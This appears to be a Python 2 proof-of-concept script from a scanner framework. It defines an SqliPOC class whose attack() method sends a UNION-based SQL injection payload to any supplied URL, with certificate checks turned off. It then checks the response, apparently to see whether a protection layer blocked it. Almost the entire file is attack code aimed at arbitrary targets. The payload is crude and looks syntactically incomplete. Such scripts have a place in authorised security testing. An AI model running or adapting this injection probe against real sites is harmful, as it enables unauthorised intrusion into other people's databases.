# -*- coding: utf-8 -*-
# Author:g0dlike
# CreateDate:2017年7月22日
# UpdateDate:2017年8月13日
import re
import requests
from poc_base import BasePoc
from poc_base import re_try


class SqliPOC(BasePoc):

    def __init__(self, url):
        BasePoc.__init__(self)

        self.createDate = '2017-7-22'
        self.updateDate = '2017-7-22'
        self.name = 'SQL Inject'
        self.vulType = 'SQL Injection'
        self.url = url

    @re_try()
    def attack(self):
        vul_url = '%s/?q=node\' and union select * from sec_test ' % self.url

        try:
            r = requests.get(vul_url, verify=False, timeout=30)
        except requests.ConnectionError:
            # 可能的封禁
            raise requests.ConnectionError
        except requests.RequestException, e:
            raise requests.RequestException

        return self.is_in_protected(r)









